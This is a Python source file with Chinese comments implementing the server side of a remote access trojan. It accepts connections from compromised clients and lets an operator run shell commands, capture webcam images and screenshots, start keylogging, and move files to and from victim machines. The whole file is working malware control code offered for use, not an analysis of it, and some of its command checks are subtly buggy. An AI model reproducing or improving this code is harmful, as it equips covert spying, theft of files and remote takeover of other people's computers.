import socket
import json
import base64
import datetime
import platform
import threading
import os
import time

def reliable_send(data):
    json_data = json.dumps(data)
    target.send(bytes(json_data,encoding='utf-8'))

def reliable_recv():
    json_data = bytearray(0)
    while True:
        try:
            json_data += target.recv(1024)
            return json.loads(json_data)
        except ValueError:
            continue
client_list = []
HostIP = '192.168.1.68'
HostPort = 54321 

# 建立soket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR , 1)

# 綁定位置
s.bind((HostIP,HostPort))

# 服務啟動
s.listen()
print('Server Start!')

def catch_client():
    while True:
        _target, _ip = s.accept()
        if (_target,_ip) not in client_list:
            client_list.append((_target,_ip))

t = threading.Thread(target=catch_client)
t.start()


target, ip = (None,None)

# 溝通
while True:
    base_command = input(f'* Base#~: ')
    if base_command == 'q':
        for i in client_list:
            target, ip = i
            reliable_send('q')
        os._exit(1)
        break
    elif base_command == 'show':
        print(f'Client can connect: ',end='')
        for i in range(0,len(client_list)):
            print(f'"{i}": {client_list[i][1]}',end=' ')
        print()
    elif base_command.isnumeric() and (int(base_command)>=0 and int(base_command)<len(client_list)):
        target, ip = client_list[int(base_command)]
        del client_list[int(base_command)]
        # 作業系統判斷
        reliable_send('os')
        _os = reliable_recv()
        if _os == '[!!] OS info not found':
            _os = 'None'
        while True:
            command = input(f'* Shell#~{str(ip)}_{_os}: ')
            # target.send(command.encode())
            reliable_send(command)
            if command == 'q':
                break
            elif command[0:2] == 'cd' and len(command) > 1:
                continue
            elif command[0:5] == 'webcam':
                image = reliable_recv()
                with open(f'{ip}_{time.time()}.png','wb') as file_down:
                    file_down.write(base64.b64decode(image))
                    print(f'file save')
            elif command[:8] == 'download':
                result = reliable_recv()
                if result[:4] != '[!!]':
                    with open(command[9:],'wb') as file_down:
                        file_down.write(base64.b64decode(result))
                else:
                    print(result)
            elif command[:6] == 'upload':
                try:
                    with open(command[7:],'rb') as file_up:
                        content = file_up.read()
                        reliable_send(base64.b64encode(content).decode('ascii'))
                except:
                    failed = '[!!] Fail to upload'
                    reliable_send(failed)
                    print(failed)
            elif command[:10] == 'screenshot':
                image = reliable_recv()
                if image[:4] != '[!!]':
                    ss_file = 'screen_' + str(ip) + '_' + str(int(datetime.datetime.now().timestamp())) + '.png'
                    with open(ss_file, 'wb') as screen:
                        screen.write(base64.b64decode(image))
                else:
                    print(image)
            elif command[:12] == 'keylog_start':
                continue
            else:
                # result = target.recv(1024)
                result = reliable_recv()
                print(result)

# 斷線
s.close()
